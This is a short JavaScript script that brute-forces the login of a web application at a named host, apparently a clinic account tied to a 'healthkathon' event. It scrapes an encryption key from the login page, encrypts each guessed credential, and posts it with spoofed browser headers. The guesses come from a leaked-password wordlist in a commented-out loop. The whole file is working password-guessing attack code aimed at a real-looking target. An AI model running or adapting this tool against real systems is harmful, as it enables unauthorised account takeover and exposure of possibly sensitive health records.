import node_cryptojs from 'node-cryptojs-aes';
import fetch from 'node-fetch';
import fs from 'fs'

const url = 'http://a.f5xcs.alpukat.id/aGVhbHRoa2F0aG9uUHJv-P/'
const wordlist_file = '/usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt'
const username = 'klinik_healthkathon'

function encrypt(message, key) {
    var CryptoJS = node_cryptojs.CryptoJS
    var JsonFormatter = node_cryptojs.JsonFormatter
    var encrypted = CryptoJS.AES.encrypt(message, key, { format: JsonFormatter })
    var encrypted_json_str = encrypted.toString()
    return encrypted_json_str
}
async function get_key_cookie() {
    var res = await fetch(url)
    var body = await res.text()
    var key = body.substring(11813 + 211, 11813 + 211 + 11)
    var cookies = res.headers.get('set-cookie')
    return { 'key': key, 'cookies': cookies }
}

async function send_user_pass(username, password, get_key_cookie) {
    username = encrypt(username,get_key_cookie['key'])
    password = encrypt(password,get_key_cookie['key'])
    username = encodeURIComponent(username)
    password = encodeURIComponent(password)
    var res = await fetch(url+'login/akses', {
        method: 'POST',
        headers: {
            cookie: get_key_cookie['cookies'],
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            Origin: 'http://a.f5xcs.alpukat.id',
            Referer: 'http://a.f5xcs.alpukat.id/aGVhbHRoa2F0aG9uUHJv-P/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
        },
        body: `username=${username}&password=${password}&typeUser=3&ci_csrf_token=`,
    })
    var body = await res.text()
    return body
}

// var wordlist = fs.readFileSync(wordlist_file, 'utf-8')
// for (var pass in wordlist.split('\n')){
    // console.log(await send_user_pass(username, pass, await get_key_cookie()))
// }
console.log(await send_user_pass('klinik_healthkathon', 'asd', await get_key_cookie()))

